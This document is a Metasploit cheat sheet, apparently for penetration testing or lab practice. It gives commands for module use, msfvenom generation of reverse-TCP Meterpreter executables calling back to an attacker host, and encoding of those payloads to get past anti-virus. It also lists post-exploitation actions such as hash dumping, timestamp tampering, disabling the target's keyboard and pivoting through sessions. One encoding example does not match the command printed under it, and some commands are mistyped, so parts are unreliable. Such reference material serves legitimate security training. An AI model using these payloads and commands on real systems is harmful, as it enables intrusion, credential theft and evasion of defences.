# Metasploit Cheat Sheet

###### Search for module:

```
msf > search [regex]
```

###### Specify and exploit to use:

```
msf > use exploit/[ExploitPath]
```

###### Specify a Payload to use:

```
msf > set PAYLOAD [PayloadPath]
```

###### Show options for the current modules:

```
msf > show options
```

###### Set options:

```
msf > set [Option] [Value]
```

###### Start exploit:

```
msf > exploit 
```

##### Useful Auxiliary Modules


###### Port Scanner:

```
msf > use auxiliary/scanner/portscan/tcp
msf > set RHOSTS 10.10.10.0/24
msf > run
```

###### DNS Enumeration:

```
msf > use auxiliary/gather/dns_enum
msf > set DOMAIN target.tgt
msf > run
```

###### FTP Server:

```
msf > use auxiliary/server/ftp
msf > set FTPROOT /tmp/ftproot
msf > run
```

###### Proxy Server:

```
msf > use auxiliary/server/socks4
msf > run 
```

#### msfvenom :

The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode 
them. This tool replaces the former msfpayload and msfencode tools. Run with ‘'-l payloads’ to get a list of payloads.

```
$ msfvenom –p [PayloadPath]
–f [FormatType]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
```

Example :

Reverse Meterpreter payload as an executable and redirected into a file:

```
$ msfvenom -p windows/meterpreter/
reverse_tcp -f exe LHOST=10.1.1.1
LPORT=4444 > met.exe
```

Format Options (specified with –f) --help-formats – List available output formats

exe – Executable
pl – Perl
rb – Ruby
raw – Raw shellcode
c – C code

Encoding Payloads with msfvenom

The msfvenom tool can be used to apply a level of encoding for anti-virus bypass. Run with '-l encoders'
to get a list of encoders.

```
$ msfvenom -p [Payload] -e [Encoder] -f
[FormatType] -i [EncodeInterations]
LHOST=[LocalHost (if reverse conn.)]
LPORT=[LocalPort]
```

Example

Encode a payload from msfpayload 5 times using shikata-ga-nai encoder and output as executable:

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=<tun0-ip> LPORT=4444
```

Staged Meterpreter shell
```shell
msfvenom -p windows/x64/meterpreter/reverse_shell -f exe -o stagedcmd.exe LHOST=<tun-0-ip> LPORT=4444
```

Stageless Meterpreter shell
```shell
msfvenom -p windows/x64/meterpreter_reverse_shell -f exe -o nonstagedcmd.exe LHOST=<tun0-ip> LPORT=4444
```

msfvenom options
```shell
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message

```

#### Meterpreter Listener

```shell
run 'msfconsole'

use 'multi/handler'

set payload to 'windows/x64/meterpreter/reverse_tcp'

set LHOST=<tun0-ip> set LPORT=4444 
```

##### Metasploit Meterpreter

###### Base Commands: 

? / help: Display a summary of commands exit / quit: Exit the Meterpreter session

sysinfo: Show the system name and OS type

shutdown / reboot: Self-explanatory

File System Commands:

cd: Change directory

lcd: Change directory on local (attacker's) machine

pwd / getwd: Display current working directory

ls: Show the contents of the directory

cat: Display the contents of a file on screen

download / upload: Move files to/from the target machine

mkdir / rmdir: Make / remove directory

edit: Open a file in the default editor (typically vi)

Process Commands:

getpid: Display the process ID that Meterpreter is running inside.

getuid: Display the user ID that Meterpreter is running with.

ps: Display process list.

kill: Terminate a process given its process ID.

execute: Run a given program with the privileges of the process the Meterpreter is loaded in.

migrate: Jump to a given destination process ID

- Target process must have same or lesser privileges

- Target process may be a more stable process

- When inside a process, can access any files that process has a lock on.

###### Network Commands:

ipconfig: Show network interface information

portfwd: Forward packets through TCP session

route: Manage/view the system's routing table

###### Misc Commands:

idletime: Display the duration that the GUI of thetarget machine has been idle.

uictl [enable/disable] [keyboard/mouse]: Enable/disable either the mouse or keyboard of the target machine.

screenshot: Save as an image a screenshot of the target machine.

###### Additional Modules:

use [module]: Load the specified module

Example:

use priv: Load the priv module

hashdump: Dump the hashes from the box

timestomp:Alter NTFS file timestamps

##### Managing Sessions

###### Multiple Exploitation: 

Run the exploit expecting a single session that is immediately backgrounded:

```
msf > exploit -z
```

Run the exploit in the background expecting one or more sessions that are immediately backgrounded:

```
msf > exploit –j
```

###### List all current jobs (usually exploit listeners):

```
msf > jobs –l
```

###### Kill a job:

```
msf > jobs –k [JobID]
```

##### Multiple Sessions:

###### List all backgrounded sessions:

```
msf > sessions -l
```

###### Interact with a backgrounded session:

```
msf > session -i [SessionID]
```

###### Background the current interactive session:

```
meterpreter > <Ctrl+Z>
or
meterpreter > background
```

###### Routing Through Sessions:

All modules (exploits/post/aux) against the target subnet mask will be pivoted through this session.

```
msf > route add [Subnet to Route To]
[Subnet Netmask] [SessionID]
```